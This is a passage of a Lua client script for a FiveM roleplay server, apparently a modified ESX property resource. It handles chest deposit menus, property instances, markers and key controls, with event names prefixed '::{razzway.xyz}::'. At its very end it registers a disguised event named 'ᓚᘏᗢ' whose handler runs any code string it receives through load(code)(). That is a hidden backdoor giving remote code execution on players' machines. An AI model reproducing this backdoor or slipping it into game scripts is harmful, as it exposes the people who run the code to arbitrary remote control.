								end
							end
						end)
					end)
				end)

				RageUI.IsVisible(RMenu:Get('sinventoryDeposer', 'dgunnsss'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerInventory', function(inventory)
						--RageUI.ButtonWithStyle("Déposez vos armes", nil, {RightLabel = "→"}, true, function(h,a,s)
							--if s then
								for i = 1, #inventory.weapons, 1 do
									local weapon = inventory.weapons[i]
									local label = weapon.label
									local rightlabel = {'(' .. weapon.ammo .. ')'}
									local type = 'item_weapon'
									local value = weapon.name
									local ammo = weapon.ammo
									RageUI.ButtonWithStyle("Arme: "..label, nil, {RightLabel = "→"}, true, function(h,a,s)
										if s then
											_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, type, value, ammo)
											RageUI.CloseAll()
										end
									end)
								end
									--local label = _U('dirtycash')
									--local rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)}
									--local type = 'item_account'
									--local value = 'dirtycash'
									--local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
									--if quantity ~= nil then
									--	_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, type, value, quantity)
									---	RageUI.CloseAll()
									--else
									--	ESX.ShowNotification(_U('amount_invalid'))
								--	end
								--end
							--end
						--end)
					end)
				end)

				RageUI.IsVisible(RMenu:Get('sinventoryDeposer', 'ditemsss'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerInventory', function(inventory)
						--[[RageUI.ButtonWithStyle("Déposez votre argent", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								if inventory.dirtycash > 0 then
									local label = _U('dirtycash')
									local rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)}
									local type = 'item_account'
									local value = 'dirtycash'
									local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
									if quantity ~= nil then
										_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, type, value, quantity)
										RageUI.CloseAll()
									else
										ESX.ShowNotification(_U('amount_invalid'))
									end
								end
							end
						end)]]
						for i = 1, #inventory.items, 1 do
							local item = inventory.items[i]
				
							if item.count > 0 then
								local label = item.label
								local rightlabel = {'(' .. item.count .. ')'}
								local type = 'item_standard'
								local value = item.name
								RageUI.ButtonWithStyle("Déposez vos items", nil, {RightLabel = "→"}, true, function(h,a,s)
									if s then
										local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
										if quantity ~= nil then
											_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, type, value, quantity)
										else
											ESX.ShowNotification(_U('amount_invalid'))
										end
									end
								end)
							end
						end
					end)
				end)

				Wait(1)
			end
		end)
	end

	--[[ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerInventory', function(inventory)
		local elements = {}

		if inventory.dirtycash > 0 then
			table.insert(elements, {
				label = _U('dirtycash'),
				rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)},
				type = 'item_account',
				value = 'dirtycash'
			})
		end

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		for i = 1, #inventory.weapons, 1 do
			local weapon = inventory.weapons[i]

			table.insert(elements, {
				label = weapon.label,
				rightlabel = {'(' .. weapon.ammo .. ')'},
				type = 'item_weapon',
				value = weapon.name,
				ammo = weapon.ammo
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_inventory', {
			title = property.label .. ' - ' .. _U('inventory'),
			elements = elements
		}, function(data, menu)
			if data.current.type == 'item_weapon' then
				menu.close()

				_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, data.current.type, data.current.value, data.current.ammo)
				ESX.SetTimeout(300, function()
					OpenPlayerInventoryMenu(property, owner)
				end)
			else
				ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'put_item_count', {
					title = _U('amount')
				}, function(data2, menu2)
					local quantity = tonumber(data2.value)

					if quantity == nil then
						ESX.ShowNotification(_U('amount_invalid'))
					else
						menu.close()
						menu2.close()

						_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, data.current.type, data.current.value, tonumber(data2.value))
						ESX.SetTimeout(300, function()
							OpenPlayerInventoryMenu(property, owner)
						end)
					end
				end, function(data2, menu2)
					menu2.close()
				end)
			end
		end, function(data, menu)
		end)
	end)]]
end

function KeyboardInputQuantity(TextEntry, ExampleText, MaxStringLenght)


    AddTextEntry('FMMC_KEY_TIP1', TextEntry) 
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLenght)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do 
        Citizen.Wait(0)
    end
        
    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult() 
        Citizen.Wait(500) 
        blockinput = false
        return result 
    else
        Citizen.Wait(500) 
        blockinput = false 
        return nil 
    end
end

AddEventHandler('::{razzway.xyz}::instance:loaded', function()
	TriggerEvent('::{razzway.xyz}::instance:registerType', 'property', function(instance)
		EnterProperty(instance.data.property, instance.data.owner)
	end, function(instance)
		ExitProperty(instance.data.property)
	end)
end)

AddEventHandler('playerSpawned', function()
	if firstSpawn then
		Citizen.CreateThread(function()
			while not ESX.IsPlayerLoaded() do
				Citizen.Wait(0)
			end

			ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getLastProperty', function(propertyName)
				if propertyName then
					if propertyName ~= '' then
						local property = GetProperty(propertyName)

						for i = 1, #property.ipls, 1 do
							RequestIpl(property.ipls[i])
				
							while not IsIplActive(property.ipls[i]) do
								Citizen.Wait(0)
							end
						end

						TriggerEvent('::{razzway.xyz}::instance:create', 'property', {property = propertyName, owner = ESX.GetPlayerData().identifier})
					end
				end
			end)
		end)

		firstSpawn = false
	end
end)

AddEventHandler('::{razzway.xyz}::esx_property:getProperties', function(cb)
	cb(GetProperties())
end)

AddEventHandler('::{razzway.xyz}::esx_property:getProperty', function(name, cb)
	cb(GetProperty(name))
end)

AddEventHandler('::{razzway.xyz}::esx_property:getGateway', function(property, cb)
	cb(GetGateway(property))
end)

RegisterNetEvent('::{razzway.xyz}::esx_property:setPropertyOwned')
AddEventHandler('::{razzway.xyz}::esx_property:setPropertyOwned', function(name, owned)
	SetPropertyOwned(name, owned)
end)

RegisterNetEvent('::{razzway.xyz}::instance:onCreate')
AddEventHandler('::{razzway.xyz}::instance:onCreate', function(instance)
	if instance.type == 'property' then
		TriggerEvent('::{razzway.xyz}::instance:enter', instance)
	end
end)

RegisterNetEvent('::{razzway.xyz}::instance:onEnter')
AddEventHandler('::{razzway.xyz}::instance:onEnter', function(instance)
	if instance.type == 'property' then
		local property = GetProperty(instance.data.property)
		local isHost = GetPlayerFromServerId(instance.host) == PlayerId()
		local isOwned = false

		if PropertyIsOwned(property) == true then
			isOwned = true
		end

		if isOwned or not isHost then
			hasChest = true
		else
			hasChest = false
		end
	end
end)

RegisterNetEvent('::{razzway.xyz}::instance:onPlayerLeft')
AddEventHandler('::{razzway.xyz}::instance:onPlayerLeft', function(instance, player)
	if player == instance.host then
		TriggerEvent('::{razzway.xyz}::instance:leave')
	end
end)

AddEventHandler('::{razzway.xyz}::esx_property:hasEnteredMarker', function(name, part)
	local property = GetProperty(name)

	if part == 'entering' then
		if property.isSingle then
			CurrentAction = 'property_menu'
			CurrentActionMsg = _U('press_to_menu')
			CurrentActionData = {property = property}
		else
			CurrentAction = 'gateway_menu'
			CurrentActionMsg = _U('press_to_menu')
			CurrentActionData = {property = property}
		end
	elseif part == 'exit' then
		CurrentAction = 'room_exit'
		CurrentActionMsg = _U('press_to_exit')
		CurrentActionData = {propertyName = name}
	elseif part == 'roomMenu' then
		CurrentAction = 'room_menu'
		CurrentActionMsg = _U('press_to_menu')
		CurrentActionData = {property = property, owner = CurrentPropertyOwner}
	end
end)

AddEventHandler('::{razzway.xyz}::esx_property:hasExitedMarker', function(name, part)
	RageUI.CloseAll()
	CurrentAction = nil
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker, letSleep = false, true
		local currentProperty, currentPart

		for i = 1, #Config.Properties, 1 do
			local property = Config.Properties[i]

			if property.entering and not property.disabled then
				local distance = GetDistanceBetweenCoords(coords, property.entering.x, property.entering.y, property.entering.z, true)

				if distance < Config.DrawDistance then
					DrawMarker(Config.MarkerType, property.entering.x, property.entering.y, property.entering.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize.x, Config.MarkerSize.y, Config.MarkerSize.z, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, nil, nil, false)
					letSleep = false
				end

				if distance < Config.MarkerSize.x then
					isInMarker = true
					currentProperty = property.name
					currentPart = 'entering'
				end
			end

			if property.exit and not property.disabled then
				local distance = GetDistanceBetweenCoords(coords, property.exit.x, property.exit.y, property.exit.z, true)

				if distance < Config.DrawDistance then
					DrawMarker(Config.MarkerType, property.exit.x, property.exit.y, property.exit.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize.x, Config.MarkerSize.y, Config.MarkerSize.z, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, nil, nil, false)
					letSleep = false
				end

				if distance < Config.MarkerSize.x then
					isInMarker = true
					currentProperty = property.name
					currentPart = 'exit'
				end
			end

			-- Room menu
			if property.roomMenu and hasChest and not property.disabled then
				local distance = GetDistanceBetweenCoords(coords, property.roomMenu.x, property.roomMenu.y, property.roomMenu.z, true)

				if distance < Config.DrawDistance then
					DrawMarker(Config.MarkerType, property.roomMenu.x, property.roomMenu.y, property.roomMenu.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize.x, Config.MarkerSize.y, Config.MarkerSize.z, Config.RoomMenuMarkerColor.r, Config.RoomMenuMarkerColor.g, Config.RoomMenuMarkerColor.b, 100, false, true, 2, false, nil, nil, false)
					letSleep = false
				end

				if distance < Config.MarkerSize.x then
					isInMarker = true
					currentProperty = property.name
					currentPart = 'roomMenu'
				end
			end
		end

		if isInMarker and not hasAlreadyEnteredMarker or (isInMarker and (LastProperty ~= currentProperty or LastPart ~= currentPart) ) then
			hasAlreadyEnteredMarker = true
			LastProperty = currentProperty
			LastPart = currentPart

			TriggerEvent('::{razzway.xyz}::esx_property:hasEnteredMarker', currentProperty, currentPart)
		end

		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			TriggerEvent('::{razzway.xyz}::esx_property:hasExitedMarker', LastProperty, LastPart)
		end

		if letSleep then
			Citizen.Wait(500)
		end
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'property_menu' then
					OpenPropertyMenu(CurrentActionData.property)
				elseif CurrentAction == 'gateway_menu' then
					if Config.EnablePlayerManagement then
						OpenGatewayOwnedPropertiesMenu(CurrentActionData.property)
					else
						OpenGatewayMenu(CurrentActionData.property)
					end
				elseif CurrentAction == 'room_menu' then
					OpenRoomMenu(CurrentActionData.property, CurrentActionData.owner)
				elseif CurrentAction == 'room_exit' then
					TriggerEvent('::{razzway.xyz}::instance:leave')
				end

				CurrentAction = nil
			end
		else
			Citizen.Wait(500)
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)